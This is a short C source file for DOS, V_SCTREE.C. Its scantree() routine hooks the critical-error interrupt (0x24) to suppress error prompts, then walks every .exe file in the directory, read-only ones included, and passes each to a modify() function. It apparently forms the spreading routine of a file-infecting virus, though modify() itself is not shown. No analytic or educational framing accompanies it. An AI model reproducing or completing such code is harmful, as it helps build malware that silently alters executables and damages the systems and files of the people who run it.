
 /* V_SCTREE.C file */
#include"v.h"
#include"v_std.h"
typedef void interrupt (*IntHandler)();

 void scantree(void)
 { struct ffblk DTA;
  void far * old_dta;
  void far * OldErrHandler;

  old_dta = get_dta();
   set_dta(MK_FP(_DS,&DTA));

 OldErrHandler = getvect(0x24);
 setvect(0x24,(IntHandler)MK_FP(_CS,err_handler));

   if(!findfirst("*.exe",FA_ARCH|FA_RDONLY))
   do modify(DTA.ff_name); while(!findnext());
  set_dta(old_dta);

 setvect(0x24,(IntHandler)OldErrHandler);

  return;

  }

